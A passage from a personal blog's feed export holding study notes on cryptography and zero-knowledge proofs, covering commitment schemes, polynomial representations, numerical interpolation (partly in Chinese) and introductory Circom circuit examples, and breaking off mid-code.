Commitment</h3><p>Vector Pederson Commitment is an extension used in the inner-productargument, which used in bulletproof. It's a really good proving systemfor efficient range proof.</p><p>It works over the message space of vectors, <spanclass="math inline">\(F^k_p\)</span>. vectors with k element fromFp.</p><ol type="1"><li><span class="math inline">\(Setup(1^\lambda, k) -&gt;{G_i}_{i=0}^{k-1}\)</span></li><li><span class="math inline">\(Commit(pp, m;r)​=[m_0​]G_0​+⋯+[m_{n−1}​]G_{n−1}​+[r]H=∑^{n−1}_{i=0}​[m_i​]G_i​\)</span>+[r]H.​</li></ol><p>The proof size of vector Pedersen commitment is linear, which ishuge.</p><blockquote><p>ref: <ahref="https://zcash.github.io/halo2/background/groups.html">Cryptographicgroups - The halo2 Book</a></p></blockquote><h2 id="vector-merkle-tree-commitment">Vector Merkle treeCommitment</h2><p>The commitment works over the message space string, <spanclass="math inline">\({0,1}_k\)</span></p><ol type="1"><li><span class="math inline">\(Commitment(pp, \vec{m}) -&gt; C =root(Merkle(\vec{m}))\)</span></li><li>Open:<ol type="1"><li><span class="math inline">\(Prove(pp, i, C, \vec{m}) -&gt; \pi =(m[i], path)\)</span></li><li><span class="math inline">\(Verify(pp, i, C, \pi) -&gt;0/1\)</span></li></ol></li></ol><h2 id="polynomial-commitments">Polynomial commitments</h2><p>KZG10</p><p>TODO</p><ul><li>[ ]</li></ul><h2 id="notice">Notice</h2><p>道理上来讲，根据运算的记号不同（是 + 还是x）针对群的乘法运算，用指数记法 G^{x}，针对群的加法运算： [x]G 和 xG都可,都是对运算进行 x 遍，但是推荐 [x]G</p><p>实际上一般 paper里面，基本混用，能看明白，表达清楚就好,就是符号记法习惯，为了与朴素加法乘法相容。</p><p>双线性映射：https://mp.weixin.qq.com/s/ug6PVMvR3UtGQgXZopWqgQ</p><p>二次非剩余的例子就是如何把 coNP问题转化为交互式零知识证明,如果用经典的证明方式，除非遍历所有可能取值，否则无法证明对NP 问题无解</p><h2 id="references">References</h2><ol type="1"><li><a href="./zk/media/ppt-notes.pdf">PPT Algorithmhttps://www.cs.miami.edu/home/burt/learning/csc609.221/notes/ppt-notes.pdf</a></li><li>[./media/commitments.pdf]</li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Learn cryptography via Python3</title>
      <link href="/blog/2023/03/30/crypto/zk/9.learn_crypto/"/>
      <url>/blog/2023/03/30/crypto/zk/9.learn_crypto/</url>
      
        <content type="html"><![CDATA[<h1 id="learn-cryptography-via-python3">Learn cryptography viaPython3</h1><p>There is a steep learning curve for learning cryptography,specifically zero knowledge proof. Qi zhou shared a great learningmethod: learning it via programming.</p><p>Every time you learn a cryptographic primitive, get a correspondingcode, and see the principle.</p><ul><li>Observe programming examples</li><li>Modify the program and see different results</li><li>Early performance benchmark</li><li>practice the usage of functions, and writing Examples Start yourproject - KZG, Plonk, etc.</li></ul><p>Python is a scripting language with native big integer support, whichis easy to implement crypto ideas.</p><p>Many famous cryptography researchers, including Vitalik, are usingpython3, and Ethereum 2.0 spec is also written in Python3</p><p>Good libraries:</p><ol type="1"><li><p><ahref="https://github.com/ethereum/research">ethereum/research</a></p><p>a lot of treasuries, Fq, polynomial over Fq, FFT</p></li><li><p><ahref="https://github.com/ethereum/py_pairing">ethereum/py_pairing:Elliptic curve operations, including pairings</a></p></li><li><p><a href="https://github.com/ethereum/py_ecc">ethereum/py_ecc:Python implementation of ECC pairing and bn_128 and bls12_381 curveoperations</a></p></li><li><p><ahref="https://github.com/Chia-Network/bls-signatures/tree/main/python-impl">bls-signatures/python-implat main · Chia-Network/bls-signatures · GitHub</a></p><p>Chia’s BLS library with ECC</p></li></ol><h2 id="common-used-libraries">Common used libraries</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from basic_crypto.poly_utils import PrimeField # operation at or between polynomials</span><br><span class="line">from basic_crypto.fft import fft</span><br><span class="line">from poly_commit.bls.fields import Fq</span><br></pre></td></tr></table></figure><p>For polynomial over Prime field</p><p>The prime root for the root of unity of BLS12-381 can be 5 or 7.</p><p>TODO</p><ul class="task-list"><li><label><input type="checkbox" />dd</label></li></ul><h2 id="references">References</h2><p><ahref="https://docs.google.com/presentation/d/1HgJaONmF1Yd-FMxXihwLvnT4oa61tAeAA_qeZjgmhHY/edit?pli=1#slide=id.g23b371aae75_0_5">LearningCrypto via Python3 qi zhou</a></p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Polynomial and representations</title>
      <link href="/blog/2023/03/30/crypto/zk/9.polynomial/"/>
      <url>/blog/2023/03/30/crypto/zk/9.polynomial/</url>
      
        <content type="html"><![CDATA[<h1 id="polynomial">Polynomial</h1><p>In this article, I will show two common ways to programpolynomial</p><h2 id="coefficient-and-point-value-representation">coefficient andpoint-value representation</h2><p>对于 degree = n-1 多项式 A(x)，</p><ol type="1"><li>Coefficient representation: 所有项的系数组成的系数向量 <spanclass="math inline">\((a_0, a_1,a_2,...,a_{n-1})\)</span>唯一确定多项式:<span class="math inline">\(A(x) =\sum_{i=0}^{n-1}a_ix^i\)</span></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># f(x) = x*4 + 3*x**2 + 4*x + 9</span></span><br><span class="line">coefficient = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>] <span class="comment"># [a4, a3, a2, a1, a0]</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">coefficient = [<span class="number">9</span>，<span class="number">4</span>，<span class="number">3</span>，<span class="number">0</span>，<span class="number">1</span>] <span class="comment"># [a0, a1, a2, a3, a4]</span></span><br></pre></td></tr></table></figure><p>Evalute polynomial at <span class="math inline">\(x=2\)</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">coeff = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>]</span><br><span class="line"><span class="comment"># evalute at x=2</span></span><br><span class="line">x,p = <span class="number">2</span>, <span class="number">17</span></span><br><span class="line"><span class="built_in">sum</span>([coeff[i] *<span class="built_in">pow</span>(x, (<span class="built_in">len</span>(coeff)-i), p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(coeff))])  % p</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="built_in">sum</span>([coeff[i]*<span class="built_in">pow</span>(x, i,p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(coeff))]) % p</span><br></pre></td></tr></table></figure><p>Note:</p><ol type="1"><li><p>the order of the coefficient should be checked carefully.</p><p>For example, <code>numpy.poly</code> expresses the sequence of thecoefficient from highest to lowest degree,<code>[a4, a3, a2, a1, a0]</code>.</p><blockquote><p><ahref="https://numpy.org/doc/stable/reference/generated/numpy.poly.html">numpy.poly— NumPy v1.24 Manual</a></p></blockquote><p><strong>But</strong> Ethereum research repository is from lowest tohighest degree, <code>[a0, a1, a2, a3, a4]</code>, which we willuse.</p></li><li><p>When evaluating the coefficient form polynomial at x under Primefield, the Python built-in function<code>pow(base, exp, mod=None)</code> is very useful.</p></li><li><p>Point-value representation: 一组互不相同的 <spanclass="math inline">\((x_0, x_1,x_2, \cdots,x_{n})\)</span> 代入 <spanclass="math inline">\(A(x)\)</span>, 得到 n 个取值 <spanclass="math inline">\((y_0,y_1, \cdots, y_n)\)</span>, 其中 <spanclass="math inline">\(y_i = \sum_{j=0}^{n}a_jx_i\)</span>，可以通过拉格朗日插值方法唯一确定多项式。</p></li></ol><h2 id="schwartz-zippel-lemma">Schwartz-Zippel lemma</h2><p>Schwartz-Zippel lemma是关于有限域中的多变量多项式零点个数的紧致上界，具体表述如下：</p><p>对于域 <span class="math inline">\(\mathbb{F}\)</span>上的每个阶最多为 d 的 n 变元非零多项式，对于任意有限集合 <spanclass="math inline">\(S \in \mathbb{F}\)</span>,</p><p><span class="math display">\[\begin{equation}    Pr_{r_1,\cdots,r_n \leftarrow S}[f(r_1, \cdots, r_n) = 0] \le\frac{d}{|S|}\end{equation}\]</span></p><p>等价地， f 在 <span class="math inline">\(S^n\)</span> 中最多有 <spanclass="math inline">\(d|S|^{n-1}\)</span> 个根, (<spanclass="math inline">\(Z(f)\)</span> 是 f 的零点集)：<spanclass="math inline">\(|Z(f) \cap S^n| \le d*|S|^{n-1}\)</span></p><h2 id="symbolic-representation">symbolic representation</h2><p>In math scenarios, the symbolic representation is used forpolynomials by utilizing <code>Matlab</code> or the <code>sympy</code>library of Python. Although I prefer the Python library, it turns outthe <code>sympy</code> library is truly not as good as<code>Matlab</code> in practice. So prefer <code>Matlab</code>.</p><p>Note: The interpolation method for polynomials in the finite field is<strong>not fully implemented</strong> in <code>sympy</code>. Therefore,it is not recommended to use it for polynomials in the finite field.</p><p>Example code in Jupyter Notebook:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> IPython.display <span class="keyword">import</span> Math</span><br><span class="line">Math(<span class="string">&quot;f(x) = \sum_&#123;i=0&#125;^&#123;n-1&#125; a_i x^i&quot;</span>)</span><br></pre></td></tr></table></figure><p><span class="math display">\[f(x) = \sum_{i=0}^{n-1} a_ix^i\]</span></p><p>将信息编码成 coefficient form 多项式的系数，还是编码成多项式的point-value representation 的值</p><h2 id="reference">Reference</h2><p><a href="https://hackmd.io/@Kurt-Pan/Bkq-tZGL5#">Schwartz-Zippel引理的证明 - HackMD</a></p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Circom for signature and group signatures</title>
      <link href="/blog/2023/03/28/crypto/zk/8.zk_circom_signature/"/>
      <url>/blog/2023/03/28/crypto/zk/8.zk_circom_signature/</url>
      
        <content type="html"><![CDATA[<h1 id="signature-and-group-signatures">signature and groupsignatures</h1><p>Reference: <ahref="https://gist.github.com/realyee/fc9c9e31483a83d585de19604c5b5056">GroupSignMerklecircom</a> give the whole procedure of Group Signature with Merkleproof.</p><h2 id="signature">signature</h2><p>Normal signature</p><ol type="1"><li>KeyGen → (sk, pk): selects a random secret key sk and correspondingpublic key pk</li><li>Sign(m, sk) → s: given a message m and secret key, outputs asignature s</li><li>Verify(m, s, pk) → 1/0: given a message m, a signature s, and apublic key pk, verifies if signature is valid</li></ol><p><ahref="https://gist.github.com/realyee/9d29ad1f85cb9dafcc135f21d9826e09">Normalsignature circom</a></p><h2 id="group-signature">group signature</h2><p>Group signature for group G</p><ol type="1"><li>KeyGen → (ski, pki): selects a random set of secret keys ski andcorresponding public keys pki for each member of group</li><li>GroupSign(m, ski, G) → : given a message m and secret key, outputs asignature s</li><li>GroupVerify(m, s, G) → 1/0: given a message m, a signature s, andthe group G, verifies if the signature came from the group</li></ol><p><ahref="https://gist.github.com/realyee/1117e8e808bc0519e38ddeba248b7368">GroupSigncircom</a></p><p>With reference to <ahref="https://0xparc.org/blog/zk-group-sigs">Group Signatures withzkSNARKs</a></p><h2 id="merkle-tree">Merkle tree</h2><p>Merkle tree is a way to sort of accumulating a bunch of differentelements set into one commitment. Note that the hash result will bedifferent if the two input elements swap the order.</p><p>With the following references:</p><ol type="1"><li><ahref="https://github.com/semaphore-protocol/semaphore/blob/main/packages/circuits/tree.circom">MerkleTree Inclusion proof semaphore/tree.circom at main ·semaphore-protocol/semaphore · GitHub</a> give the code about MerkleTree Inclusion proof.</li><li><ahref="https://github.com/iden3/circomlib/blob/master/circuits/poseidon.circom#L202">circomlib/poseidon.circomat master · iden3/circomlib · GitHub</a> and <ahref="https://github.com/iden3/circomlib/blob/cff5ab6288b55ef23602221694a6a38a0239dcc0/circuits/comparators.circom#L37">circomlib/comparators.circomat cff5ab6288b55ef23602221694a6a38a0239dcc0 · iden3/circomlib</a> givethe usage of poseidon hash and comparators/IsEqual.</li><li><ahref="https://github.com/tornadocash/tornado-core/blob/master/circuits/merkleTree.circom">tornado-core/merkleTree.circomat master · tornadocash/tornado-core · GitHub</a> give the circom of theverification of the Merkle Tree proof</li><li><a href="https://hackmd.io/@vb7401/zk-crypto-4">Modern ZK Crypto -Session 4 Lecture Notes - HackMD</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数值方法/数值分析与插值</title>
      <link href="/blog/2023/03/27/crypto/math/8.numerical_analysis/"/>
      <url>/blog/2023/03/27/crypto/math/8.numerical_analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="数值方法数值分析">数值方法/数值分析</h1><p>《计算方法-数值分析与程序设计》-(Introduction to Numerical Analysisand Scientific Computing</p><p>还有近似计算，随机算法，凸优化</p><p>插值法是逼近论中的一种基本方法。多项式插值是整个数值逼近的基础,但是高次插值产生的Runge现象限制了它的应用。有理插值的收敛速度较多项式快,它适合于逼近有极点的函数</p><p>基本类型有：pln（多项式函数插值）、trig（三角函数）、exp（指数函数）、rational（有理函数）、splines（分段函数）、Hermite（埃尔米特）</p><p>不同插值方法的区别在于插值函数 p(x) 的选取。</p><h2 id="方法补充说明">方法补充说明</h2><ol type="1"><li><p>多项式 几何上可理解为：已知平面上 n+1 个不同点，要寻找一条 n次多项式曲线通过这些点。插值多项式一般有两种常见的表达形式，一个是拉格朗日插值多项式，另一个是牛顿插值多项式。注意：因多项式函数插值存在龙格现象（下图所示），故尽可能选取5 次及以下多项式函数插值。</p></li><li><p>三角函数 当被插函数是以 2π 为周期的函数时，通常用 n阶三角多项式作为插值函数，一般要运用傅里叶变换及高斯三角插值表出。</p></li><li><p>指数函数 分析爆炸性增长现象或放射性元素衰减时常被采用</p></li><li><p>有理函数有理函数是通过多项式的加减乘除得到的函数。在数学中，理性函数是可以由有理分数定义的任何函数，即代数分数，使得分子和分母都是多项式。</p></li><li><p>分段函数（三次样条插值法）连续两端接入节点的函数值和导数相等</p></li><li><p>埃尔米特这类插值在给定的节点处，不仅要求插值多项式的函数值与原函相同，还要求在节点处的导数值甚至高阶导数值也相等。即要求与原函光滑程度高度相似。注意：直接使用Hermite 插值得到的多项式次数较高，也存在着龙格现象，因此在实际应用中，往往使用分段三次 Hermite 插值多项式 (PCHIP)。</p></li></ol><h2 id="参考资料">参考资料</h2><p><ahref="https://www.bilibili.com/opus/735477926585171990?from=search">数值方法/数值分析（完）- 哔哩哔哩</a></p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>circom2 for zkSNARK</title>
      <link href="/blog/2023/03/26/crypto/zk/6.zk_circom1/"/>
      <url>/blog/2023/03/26/crypto/zk/6.zk_circom1/</url>
      
        <content type="html"><![CDATA[<h1 id="zksnark">zkSNARK</h1><h2 id="high-level-idea">High-level idea</h2><ol type="1"><li>Turn your problem (graph isomorphism, discrete log, etc.) into afunction whose inputs you want to hide.</li><li>Turn that function into an equivalent set of R1CS (or other)equations<ol type="1"><li>Basically, an arithmetic circuit, that is a bunch of <code>+</code>and <code>*</code> operations on prime field elements</li><li>Simplified: equations of the form <span class="math inline">\(x_i +x_j = x_k, or x_i * x_j = x_k\)</span></li></ol></li><li>Generate a ZKP for satisfiability of the R1CS</li></ol><h2 id="zksnark-prove-constraints">zkSNARK prove constraints</h2><p>The best is those zk protocols that generate a proof of the same sizeregardless of the length of the computation and the verification alsotakes the same time.</p><p>Example:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function inputs: x1, x2, x3, x4</span><br><span class="line">OUT = f(x) = (x1 + x2) * x3 - x4</span><br></pre></td></tr></table></figure><p>zkSNARK: I know some secret (x1,x2,x3,x4) such that the result ofthis computation f is OUT. Here's is a signature that prove that I knowsuch a tuple, without telling you what the tuple actually is.</p><p>From the perspective of a human, the procedure of the computation ismade as follows:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function inputs: x1, x2, x3, x4</span><br><span class="line">y1 := x1 + x2</span><br><span class="line">y2 := y1 * x3</span><br><span class="line">OUT := y2 - x4</span><br></pre></td></tr></table></figure><p>However, from perspective of SNARK generating the proof, where only<code>+</code> and <code>*</code> is made as follows: SNARK proverinputs: x1, x2, x3, x4, y1, y2, OUT SNARK prover output: a “signature”that only verifies if the following constraints are satisfied:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">y1 == x1 + x2</span><br><span class="line">y2 == y1 * x3</span><br><span class="line">y2 == OUT + x4</span><br></pre></td></tr></table></figure><p>The SNARK basically is just a proof of satifaction of someconstraints. For the snark machinery, it will see seven varibles<code>x1, x2, x3, x4, y1, y2, OUT</code>. The prover's out is asignature、a proof that should only be valid if the above threeequations are ture. OUT is the value that will be reveal to theverifier. The snark proof is about proving that the prover knows somesix values satisfy this three equations for a particular public value ofOUT. Proving that I know some solution to this set of equations isequivalent to proving that I have executed this function.</p><p>If you care about actually hiding some inputs, then the funtion youare computiong is better to be a funtion that cannot be recoverable orreversed, which is zkSNARK. But sometime you dont care about that, youjust care about a succict proof of the computation, which is SNARK.</p><p>If the example include division, such as:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function inputs: x1, x2, x3, x4</span><br><span class="line">OUT = f(x) = (x1 + x2) / x3 - x4</span><br></pre></td></tr></table></figure><p>Then, the computation can be seen as follows:</p><p>From the perspective of human,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function inputs: x1, x2, x3, x4</span><br><span class="line">y1 := x1 + x2</span><br><span class="line">y2 := y1 / x3</span><br><span class="line">OUT := y2 - x4</span><br></pre></td></tr></table></figure><p>From the perspective of prover, (note the equivalence of the tworepresentation)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SNARK prover inputs: x1, x2, x3, x4, y1, y2, OUT</span><br><span class="line">SNARK prover output: a “signature” that only verifies if the following constraints are satisfied:</span><br><span class="line">y1 == x1 + x2</span><br><span class="line">y1 == y2 * x3 with x3 != 0</span><br><span class="line">y2 == OUT + x4</span><br></pre></td></tr></table></figure><p>In zkrepl, the code can be shown as follows:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma circom <span class="number">2.1</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line">template <span class="title class_">Example</span> () &#123;</span><br><span class="line">    <span class="comment">// instantiate the variables</span></span><br><span class="line">    signal input x1;</span><br><span class="line">    signal input x2;</span><br><span class="line">    signal input x3;</span><br><span class="line">    signal input x4;</span><br><span class="line"></span><br><span class="line">    signal input y1;</span><br><span class="line">    signal input y2;</span><br><span class="line"></span><br><span class="line">    signal input <span class="variable constant_">OUT</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write the constraints</span></span><br><span class="line">    y1 === x1 + x2;</span><br><span class="line">    y1 === y2 * x3;</span><br><span class="line">    y2 === <span class="variable constant_">OUT</span> + x4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Circom allows you to specify which of your varibles are public to the verifier. By default, the varibles are private</span></span><br><span class="line">component main &#123; public [ <span class="variable constant_">OUT</span> ] &#125; = <span class="title class_">Example</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// the following lines is used to test whether the proof and verification is done right by using cases</span></span><br><span class="line"><span class="comment">/* INPUT = &#123;</span></span><br><span class="line"><span class="comment">    &quot;x1&quot;: &quot;15&quot;,</span></span><br><span class="line"><span class="comment">    &quot;x2&quot;: &quot;13&quot;,</span></span><br><span class="line"><span class="comment">    &quot;x3&quot;: &quot;7&quot;,</span></span><br><span class="line"><span class="comment">    &quot;x4&quot;: &quot;1&quot;,</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &quot;y1&quot;: &quot;28&quot;,</span></span><br><span class="line"><span class="comment">    &quot;y2&quot;: &quot;4&quot;,</span></span><br><span class="line"><span class="comment">    &quot;OUT&quot;: &quot;3&quot;</span></span><br><span class="line"><span class="comment">&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// press shift + enter, &quot;Everything went okay, circom safe&quot; means the circom are able to generate the artifacts and proof of zkSANRK</span></span><br><span class="line"><span class="comment">/* if the following line appears under the “ARTIFACTS:&quot;，it means constraint you write is ok,</span></span><br><span class="line"><span class="comment">which can be compiled as a proof, but the specific value you are using to test is not right, which is not meet the constraints</span></span><br><span class="line"><span class="comment">FAIL:</span></span><br><span class="line"><span class="comment">Error: Assert Failed.</span></span><br><span class="line"><span class="comment">Error in template Example_0 line: 17</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>Note: In the end of the INPUT and before the <code>&#125;</code>, no commais allowed, or the error "Expected double-quoted property name in JSONat position 62" will be reported.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma circom 2.1.4;</span><br><span class="line"></span><br><span class="line">template Example () &#123;</span><br><span class="line">    // instantiate the variables</span><br><span class="line">    signal input x1;</span><br><span class="line">    signal input x2;</span><br><span class="line">    signal input x3;</span><br><span class="line">    signal input x4;</span><br><span class="line"></span><br><span class="line">    signal y1;</span><br><span class="line">    signal y2;</span><br><span class="line"></span><br><span class="line">    signal output out;</span><br><span class="line"></span><br><span class="line">    y1 &lt;-- x1 + x2;</span><br><span class="line">    y2 &lt;-- y1 / x3;</span><br><span class="line">    out &lt;-- y2 - x4;</span><br><span class="line"></span><br><span class="line">    // write the constraints</span><br><span class="line">    y1 === x1 + x2;</span><br><span class="line">    y1 === y2 * x3;</span><br><span class="line">    y2 === out + x4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Circom allows you to specify which of your varibles are public to the verifier. By default, the varibles are private</span><br><span class="line">component main = Example();</span><br><span class="line"></span><br><span class="line">// the following lines is used to test whether the proof and verification is done right by using cases</span><br><span class="line">/* INPUT = &#123;</span><br><span class="line">    &quot;x1&quot;: &quot;4&quot;,</span><br><span class="line">    &quot;x2&quot;: &quot;6&quot;,</span><br><span class="line">    &quot;x3&quot;: &quot;2&quot;,</span><br><span class="line">    &quot;x4&quot;: &quot;1&quot;</span><br><span class="line">&#125; */</span><br></pre></td></tr></table></figure><p>The circom is a specification of a constraint system that you areallowed to prove satisfaction, rather than a program To elimanate theintermediate value redundancy for us, the circom provide the functionlike what we precompute the intermediate value in python or somewhereelse.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma circom 2.1.4;</span><br><span class="line"></span><br><span class="line">template Example () &#123;</span><br><span class="line">    // instantiate the variables</span><br><span class="line">    signal input x1;</span><br><span class="line">    signal input x2;</span><br><span class="line">    signal input x3;</span><br><span class="line">    signal input x4;</span><br><span class="line"></span><br><span class="line">    signal y1;</span><br><span class="line">    signal y2;</span><br><span class="line"></span><br><span class="line">    signal output out;</span><br><span class="line"></span><br><span class="line">    y1 &lt;-- x1 + x2;</span><br><span class="line">    y2 &lt;-- y1 / x3;</span><br><span class="line">    out &lt;-- y2 - x4;</span><br><span class="line"></span><br><span class="line">    // write the constraints</span><br><span class="line">    y1 === x1 + x2;</span><br><span class="line">    y1 === y2 * x3;</span><br><span class="line">    y2 === out + x4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Circom allows you to specify which of your varibles are public to the verifier. By default, the varibles are private</span><br><span class="line">component main = Example();</span><br><span class="line"></span><br><span class="line">// the following lines is used to test whether the proof and verification is done right by using cases</span><br><span class="line">/* INPUT = &#123;</span><br><span class="line">    &quot;x1&quot;: &quot;4&quot;,</span><br><span class="line">    &quot;x2&quot;: &quot;6&quot;,</span><br><span class="line">    &quot;x3&quot;: &quot;2&quot;,</span><br><span class="line">    &quot;x4&quot;: &quot;1&quot;</span><br><span class="line">&#125; */</span><br></pre></td></tr></table></figure><h2 id="num2bits">Num2Bits</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma circom 2.1.4;</span><br><span class="line"></span><br><span class="line">template Num2Bits (nBits) &#123;</span><br><span class="line">    signal input in;</span><br><span class="line">    signal input b[nBits];</span><br><span class="line"></span><br><span class="line">    var sum = 0;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        sum += (2**i) * b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    in === sum;</span><br><span class="line">    for(var i = 0; i &lt; nBits; i++)&#123;</span><br><span class="line">        0 === b[i] * (b[i] - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">component main &#123; public [ b ] &#125; = Num2Bits(5);</span><br><span class="line">// note: b array is from b0 to b(n-1), the left bit is the least significant bit</span><br><span class="line">/* INPUT = &#123;</span><br><span class="line">    &quot;in&quot;: &quot;11&quot;,</span><br><span class="line">    &quot;b&quot;:[&quot;1&quot;, &quot;1&quot;, &quot;0&quot;, &quot;1&quot;,&quot;0&quot;]</span><br><span class="line">&#125; */</span><br></pre></td></tr></table></figure><p>simplify the above code,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 